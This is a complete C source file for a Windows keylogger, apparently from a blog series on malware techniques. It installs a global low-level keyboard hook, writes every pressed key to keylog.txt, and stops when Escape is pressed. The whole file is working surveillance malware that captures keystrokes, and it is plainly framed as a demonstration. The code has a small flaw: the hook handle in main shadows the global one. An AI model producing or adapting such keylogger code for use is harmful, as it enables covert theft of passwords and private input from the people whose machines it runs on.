/*
 * hack.c
 * save keystrokes to file
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/05/01/malware-tricks-46.html
 */
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

HHOOK hook;
LPMSG msg;
bool runThread = true;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
  if (code == HC_ACTION && wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

    if (p->vkCode == VK_ESCAPE) {
      runThread = false;
      UnhookWindowsHookEx(hook);
      printf("hooking disabled by esc key. meow =^..^=\n");
      PostQuitMessage(0);
      return 0;
    }

    // open file in append mode
    FILE* fp = fopen("keylog.txt", "a+");
    if (fp) {
      DWORD key = p->vkCode;
      fprintf(fp, "key pressed: %c\n", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
      fclose(fp);
    }
  }
  return CallNextHookEx(hook, code, wParam, lParam);
}

// classic keylogger logic
int main(int argc, char* argv[]) {
  MSG msg;

  // install the hook - using the WH_KEYBOARD_LL action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
  if (hook == NULL) {
    printf("failed to install hook :(\n");
    return 1;
  }

  printf("hook installed. meow =^..^= press esc to stop :)\n");

  // message loop
  while (runThread && GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  return 0;
}